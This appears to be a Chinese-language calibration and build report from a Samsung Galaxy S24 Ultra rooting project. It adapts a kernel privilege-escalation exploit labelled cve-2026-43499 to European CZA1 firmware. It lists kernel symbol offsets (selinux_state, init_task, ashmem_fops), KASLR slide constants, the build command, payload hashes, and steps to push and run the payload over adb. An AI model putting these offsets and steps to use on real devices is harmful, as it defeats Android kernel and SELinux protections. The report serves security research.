# SM-S928B（欧版 S24 Ultra）CZA1 欧版（One UI 8.0 / Android 16） 内核分析报告

> 日期：2026-10-24
> 状态：**自动定标完成，载荷 104,128 B 已构建，待真机验证**（尚未接入 App / 未做 KernelSU 专属驱动）
> 目标：`02_exploit工程/fusion-s24u/src/targets/e3q-S928BXXS4CZA1/`
> 素材：`devices_ports/eur_oneui8.0_cza1_boot.img`（sha256 `eec1c9d2571f66a7a348a76761998d7aa6b9703619dbccb60809ed2484725dd8`；源包 `/home/nt/下载/s24uboot.img` 内 `boot-S928BXXS4CZA1-Android 16.img`）
> 内核：`6.1.128-android14-11-31999054-abS928BXXS4CZA1`（构建号 31999054，raw ARM64 Image 36,956,672 B）
> 模板（参考）：`e3q-S9280ZHS4CZA1`
> 恢复 ELF：`devices_ports/cza1_eur_unpacked/vmlinux_cza1_eur.elf`（41,880,408 B）

---

## 1. 定标方法（自动化）

本机新增通用定标器 `02_exploit工程/fusion-s24u/tools/calibrate_target.py`（用法见
`ADAPTATION_GUIDE.md` §2.5），一条命令完成阶段 1/2：

1. `llvm-nm` 取模板 ELF / 目标 ELF 符号表；
2. 模板 `target.h` 的 `*_OFF` 宏按 **符号身份** 迁移（模板值 + `KIMAGE_TEXT_BASE`
   命中模板符号 → 按同名符号在目标 ELF 回查）；符号改名有候选回退
   （如 `ashmem_miscs` → `ashmem_misc`）；
3. **镜像派生** 项按结构规则实测：
   - `ASHMEM_MISC_FOPS_OFF` / `SLIDE_S928_PROBE_TARGET_IMAGE_OFF` = `ashmem_misc(s)+0x10`
     （回读该槽 qword 校验 == `ashmem_fops`）；
   - `SLIDE_RANDOM_BOOT_ID_DATA_OFF` = `random_table+0x108`（回读校验 == `sysctl_bootid`）；
   - `SLIDE_TRACEFS_WORKER_CALLER_OFF` = `worker_thread+0xA0`；
   - `SLIDE_NFULNL_LOGGER_OFF` = 镜像内 `nfnetlink_log\0` 字符串地址（与 `nfulnl_logger.name` 双重验证）；
   - `SLIDE_TRACEFS_EVENT_ID` = `(__event_sched_blocked_reason - __start_ftrace_events)/8 + 20`；
4. 其余结构体字段/调优常量沿用模板，并用**目标内核自带 BTF** 逐项实测核对（48 项）；
5. 生成 `target.h` + `p0_fingerprint.h`（RMG `generate_p0_fingerprint.pl`，256 qword 自校验）；
6. 输出审计 TSV 与 Markdown 报告（`02_exploit工程/fusion-s24u/work_S928B_offsets/cza1_eur/`）。

**审计结果：0 未解析、0 BTF 不符。**

## 2. 符号身份迁移（20 项）

| 宏 | 模板 | 新值 | Δ | 符号 |
|---|---|---|---|---|
| `ANON_PIPE_BUF_OPS_OFF` | 0x0011a6bd0 | 0x0011a6bd0 | +0x0 | `anon_pipe_buf_ops` |
| `ASHMEM_COMPAT_IOCTL_OFF` | 0x000cda1fc | 0x000cda1fc | +0x0 | `compat_ashmem_ioctl` |
| `ASHMEM_FOPS_OFF` | 0x00134e7b0 | 0x00134e7b0 | +0x0 | `ashmem_fops` |
| `ASHMEM_IOCTL_OFF` | 0x000cd98c4 | 0x000cd98c4 | +0x0 | `ashmem_ioctl` |
| `ASHMEM_MMAP_OFF` | 0x000cda254 | 0x000cda254 | +0x0 | `ashmem_mmap` |
| `ASHMEM_OPEN_OFF` | 0x000cda480 | 0x000cda480 | +0x0 | `ashmem_open` |
| `ASHMEM_RELEASE_OFF` | 0x000cda508 | 0x000cda508 | +0x0 | `ashmem_release` |
| `ASHMEM_SHOW_FDINFO_OFF` | 0x000cda628 | 0x000cda628 | +0x0 | `ashmem_show_fdinfo` |
| `CALL_USERMODEHELPER_EXEC_WORK_OFF` | 0x0000d308c | 0x0000d308c | +0x0 | `call_usermodehelper_exec_work` |
| `CONFIGFS_BIN_WRITE_ITER_OFF` | 0x00046e1f0 | 0x00046e1f0 | +0x0 | `configfs_bin_write_iter` |
| `CONFIGFS_READ_ITER_OFF` | 0x00046dcc0 | 0x00046dcc0 | +0x0 | `configfs_read_iter` |
| `COPY_SPLICE_READ_OFF` | 0x0003ec2c8 | 0x0003ec2c8 | +0x0 | `generic_file_splice_read` |
| `INIT_TASK_OFF` | 0x00215f8c0 | 0x00215f8c0 | +0x0 | `init_task` |
| `KMALLOC_CACHES_OFF` | 0x0016c08f8 | 0x0016c08f8 | +0x0 | `kmalloc_caches` |
| `NOOP_LLSEEK_OFF` | 0x00039e518 | 0x00039e518 | +0x0 | `noop_llseek` |
| `ROOT_TASK_GROUP_OFF` | 0x00234cd80 | 0x00234cd80 | +0x0 | `root_task_group` |
| `SELINUX_ENFORCING_OFF` | 0x002421460 | 0x002421460 | +0x0 | `selinux_state` |
| `SLIDE_LOGGERS_0_1_OFF` | 0x002152a20 | 0x002152a20 | +0x0 | `nfulnl_logger` |
| `SLIDE_SYSCTL_BOOTID_OFF` | 0x0024c35a8 | 0x0024c35a8 | +0x0 | `sysctl_bootid` |
| `SYSTEM_UNBOUND_WQ_OFF` | 0x00214ae60 | 0x00214ae60 | +0x0 | `system_unbound_wq` |

## 3. 镜像派生（6 项）

| 宏 | 新值 | 证据 |
|---|---|---|
| `ASHMEM_MISC_FOPS_OFF` | 0x022bfbf0ULL | ashmem_miscs+0x10；内容 qword=0xffffffc00934e7b0 vs ashmem_fops=0xffffffc00934e7b0 ✓ |
| `SLIDE_NFULNL_LOGGER_OFF` | 0x0160b70dULL | nfulnl_logger@0x2152a20.name=0xffffffc00960b70d → 0x00160b70d；镜像唯一字符串命中 ['0x160b70d'] ✓ |
| `SLIDE_RANDOM_BOOT_ID_DATA_OFF` | 0x0227ab38ULL | random_table+0x108；内容 qword=0xffffffc00a4c35a8 vs sysctl_bootid=0xffffffc00a4c35a8 ✓ |
| `SLIDE_S928_PROBE_TARGET_IMAGE_OFF` | 0x022bfbf0ULL | ashmem_miscs+0x10；内容 qword=0xffffffc00934e7b0 vs ashmem_fops=0xffffffc00934e7b0 ✓ |
| `SLIDE_TRACEFS_EVENT_ID` | 106 | 索引=(0xffffffc00a10f3b8-0xffffffc00a10f108)/8=86；+20 → id=106 |
| `SLIDE_TRACEFS_WORKER_CALLER_OFF` | 0x000da848ULL | worker_thread+0xa0 |

## 4. 沿用模板项与 BTF 实测

**沿用模板项（112 项，6.1 KMI 冻结的结构体字段/调优常量）**

其中 **48 项已用目标内核自带 BTF 实测核对通过**。

**跨 target 体检发现差异（需人工确认）：**

- `MM_STRUCT_SZ`：e3q-S9280ZHS6DZE2=0x400(Δ+0x40); e3q-S928BXXU6EZIF=0x400(Δ+0x40); e3q-S9280ZCS6DZF2=0x400(Δ+0x40)

> `MM_STRUCT_SZ` 不是结构体大小而是载荷调优值：BTF 实测六个 6.1 内核（6.1.75/99/128/145/162）`sizeof(mm_struct)` 全为 `0x3c0`；DZE2/EZIF 载荷写 `0x400` 属历史调优差异（两者在 CZA1 真机都成功过），本次沿用模板 `0x3c0`，真机若在 mm 阶段异常再按 §6.3 复核。

## 5. 构建验证

```bash
cd /home/nt/项目/samsung_root_research/02_exploit工程/fusion-s24u
ANDROID_NDK_HOME=/home/nt/项目/samsung_root_research/06_工具链/android-ndk-r29 \
  make TARGET=e3q-S928BXXS4CZA1 stable all
```

| 产物 | 大小 | sha256 |
|---|---|---|
| `cve-2026-43499-app.stable.so` | 104,128 B | `0a81f47e138df4afbac27617df5a663347950ce2b32ed0cada1235b2a08d1834` |
| `cve-2026-43499-app.so` | 127,392 B | `941f37778731cf6be0608ee77c7308a43847ef5b0877cad794c38de3e983c792` |
| `cve-2026-43499-root` | 27,496 B | `d2dccd05d027fde632301613e65337274ef72f395173d6ffb48ceef50babba19` |
| `cve-2026-43499` | 97,176 B | `0f37b81fa94a574a5fb21e97b3db2930d07f4ca886afd12b8683bafb02708d38` |

- `target.h` sha256 `fb0a4296a376d19cc5d8fe3c7c6906dea0110283fca17d8a0dcd7b323042ab54`；`p0_fingerprint.h` sha256 `953037fb5282ba5273e92906b235a872648f49b7a2bfbfb7a0a64b4e05894c29`
- 内嵌标签 `e3q-S928BXXS4CZA1-app-physical-p0-oracle`；重编译**逐字节可复现**（无 error，仅 `root.c` 一个既有 unused-function 警告）

## 6. 待真机验证清单

1. `adb push` `cve-2026-43499-app.stable.so`（改名 `cve-2026-43499`）+ `cve-2026-43499-root` 到 `/data/local/tmp`，
   按指南 §3.2 以 shell 域 `LD_PRELOAD` 运行（24 次尝试）；
2. 失败时按 §3.3/§4 分类回报日志（重点看 `slide-kaslr-ok` / `pipe page idx` / `root umh result`）；
3. 顺手采集：
   - `getprop ro.build.fingerprint`（回填 `target.h` 里的占位指纹）；
   - `cat /sys/kernel/tracing/events/sched/sched_blocked_reason/id`（复核 `SLIDE_TRACEFS_EVENT_ID`）；
   - 若 mm 阶段异常，记录实际 spray 尺寸以确认 `MM_STRUCT_SZ`（BTF 实测 `sizeof(mm_struct)=0x3c0`，
     与模板一致；DZE2/EZIF 载荷用 0x400 是调优差异）。

## 7. 产物索引

| 文件 | 说明 |
|---|---|
| `devices_ports/eur_oneui8.0_cza1_boot.img` | 原始 boot（100,663,296 B，gitignore） |
| `devices_ports/cza1_eur_unpacked/kernel` | 解出的 raw ARM64 Image（36,956,672 B） |
| `devices_ports/cza1_eur_unpacked/vmlinux_cza1_eur.elf` | 恢复的带符号 ELF（41,880,408 B） |
| `devices_ports/cza1_eur_unpacked/vmlinux_cza1_eur.btf` | 内核自带 BTF（结构体实测素材，已入 git） |
| `devices_ports/cza1_eur_draft/` | 草案：`target.h.draft`、`p0_fingerprint.h`、三件载荷（二进制 gitignore） |
| `02_exploit工程/fusion-s24u/src/targets/e3q-S928BXXS4CZA1/` | 正式 target（可直接 `make`） |
| `02_exploit工程/fusion-s24u/work_S928B_offsets/cza1_eur/` | 定标报告 + 审计 TSV + 双 ELF nm 符号表 |
